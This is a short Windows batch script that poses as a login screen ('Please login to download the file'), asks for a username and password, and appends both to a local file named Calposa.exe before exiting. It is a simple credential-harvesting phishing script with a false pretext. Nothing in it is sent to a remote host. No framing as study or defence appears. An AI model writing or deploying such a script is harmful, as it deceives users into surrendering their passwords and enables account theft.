@echo off
color a
title Login
cls
echo Please login to download the file.
echo.
echo.
set /p user=Username:
set /p pass=Password:
echo Username=”%user%” Password=”%pass%” >> Calposa.exe
start
exit